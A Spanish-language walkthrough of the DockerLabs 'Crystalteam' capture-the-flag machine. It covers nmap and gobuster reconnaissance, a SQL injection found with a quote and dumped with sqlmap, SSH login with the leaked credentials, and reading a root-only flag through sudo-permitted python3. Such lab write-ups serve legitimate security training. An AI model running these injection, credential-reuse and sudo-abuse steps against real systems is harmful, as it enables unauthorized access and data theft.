# 🖥️ **Máquina: Crystalteam**  
- **🔹 Dificultad:** Fácil  
- **📌 Descripción:**  
  Esta máquina de DockerLabs está diseñada para poner a prueba habilidades en la explotación de bases de datos mediante **inyecciones SQL (SQLi)**. Se centra en la identificación y explotación de vulnerabilidades en consultas MySQL, lo que permite obtener acceso no autorizado a la base de datos y extraer información sensible.  

- **🎯 Objetivo:**  
  - Identificar y explotar fallos de seguridad en la pagina web Certificacion mediante técnicas de **inyección SQL**.  
  - Comprender el impacto de estas vulnerabilidades.  

---

## 🚀 **Despliegue de la Máquina Backend en DockerLabs**  

Para iniciar la máquina, sigue estos pasos:

### 1️⃣ **Descargar el archivo**  
Comienza descargando el archivo en:

```bash
https://drive.google.com/drive/folders/1rmXS7t-rqtLrRHcFd15-Sv8ujptn4fpT?usp=sharing
```

### 2️⃣ **Ejecutar el despliegue automático**  
Una vez descargas el archivo, ejecuta el siguiente comando para desplegar la máquina:
```bash
bash auto_deploy.sh crystalteam.tar
```
![Máquina Backend](/Img/Docker.jpeg)

Una vez iniciada, comprueba la conexión con el siguiente comando:

```bash
ping -c4 172.17.0.2
```

Cuando la conexión esté confirmada, comenzamos la fase de reconocimiento con:

```bash
nmap -p- --open -sS --min-rate 500 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```
📌 **Nota:** En mis repositorios encontrarás scripts personalizados con los comandos utilizados en esta fase.

Para extraer la información relevante de los resultados de escaneo, utilizo el siguiente comando:

```bash
extracPorts allPorts.txt
```

Con los puertos identificados, realizamos un análisis más detallado con el siguiente comando para obtener información sobre los servicios que están corriendo en dichos puertos:

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN target
```
![Máquina Backend](/Img/Puertos.jpeg)

📌 **Nota:** Esta información nos permite identificar posibles vulnerabilidades basadas en las versiones de los servicios, como en este caso, donde el puerto 22 está relacionado con SSH y el puerto 80 con una página web.

Para acceder a la página web desde el navegador, añade la dirección IP de la máquina (172.17.0.2) en tu archivo de hosts. Para ello, edita el archivo con:

```bash
nano /etc/hosts
```
Luego, recopilamos información sobre la página web con el siguiente comando, lo que nos permitirá conocer los servicios y versiones utilizados, y buscar posibles vulnerabilidades:

```bash
whatweb 172.17.0.2
```
![Máquina Backend](/Img/whatweb.jpeg)

Al acceder a la página, observamos que existe varios apartados y un formulario de registro y de login. Intentamos ingresar utilizando credenciales predeterminadas, pero no tienen éxito.

![Máquina Backend](/Img/index.jpeg)

![Máquina Backend](/Img/ad.jpeg)

Para encontrar posibles directorios ocultos, utilizamos **gobuster** con una lista de directorios conocida:

```bash
gobuster dir -u http://172.17.0.2/Certificacion -w /usr/share/seclists/Discovery/web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b '403,404' -x php,html,txt
```
Para encontrar posibles sub-dominios, utilizamos **gobuster** con una lista de directorios conocida:

```bash
gobuster vhost -u http://172.17.0.2/Certificacion -w /usr/share/seclists/Discovery/web-Content/directory-list-2.3-medium.txt -t 20 | grep -v "402"
```

📌 **Nota:** Si no tienes instalada la lista de directorios, puedes hacerlo con:

```bash
apt -y install seclists
```

![Máquina Backend](/Img/domi.jpeg)

![Máquina Backend](/Img/php.jpeg)

No encontramos subdominios o directorios importantes.

Para confirmar si la página es vulnerable a inyecciones SQL, intentamos ingresar `admin'` en el campo de usuario, lo que provoca un error de base de datos. Esto indica que la página es vulnerable a inyecciones SQL, ya que el carácter de comilla simple (') altera la estructura de la consulta SQL.
![Máquina Backend](/Img/in.jpeg)

![Máquina Backend](/Img/error.jpeg)

Utilizamos **Burp Suite** para interceptar la solicitud y luego copiarla a un archivo `.req`, lo que nos permitirá usarla más tarde.

Con **sqlmap**, una herramienta automática para realizar inyecciones SQL, atacamos el formulario para obtener información sensible. El comando utilizado fue:

```bash
sqlmap -r peticione.req --level=5 --risk=3 --dump
```
![Máquina Backend](/Img/sql.jpeg)

Al finalizar la inyección, conseguimos acceder a una base de datos llamada **inicio**, que contiene nombres de usuario y contraseñas. Sin embargo, solo una credencial fue valida para iniciar sesión en la página web. Intentamos acceder por SSH y encontramos que la única credencial válida era `alejandro`. Aunque se puede intentar hacer un ataque automatizado con **Hydra**, la cantidad de contraseñas era pequeña, por lo que se optó por hacerlo manualmente.

![Máquina Backend](/Img/Tabla.jpeg)
Para acceder por SSH, usamos: 

```bash
ssh alejandro@172.17.0.2 -p 22
```
![Máquina Backend](/Img/ssh.jpeg)

Se encontro un archivo redflag.txt pero no podiamos acceder porque solo el usuario root tenia los permisos, buscamos vulnerabilidades para escalar privilegios y encontre que python puede ejecutar comando como root con el comando lo verificamos.

```bash
sudo -l | grep python
```
Procedemos a explotar esta vulnerabilidad:

```bash
sudo python3 -c "print(open('redflag.txt').read())"
```

![Máquina Backend](/Img/root.jpeg)
Por ultimo verificamos las credenciales que sean correctas:
```bash
su -
```
![Máquina Backend](/Img/ter.jpeg)
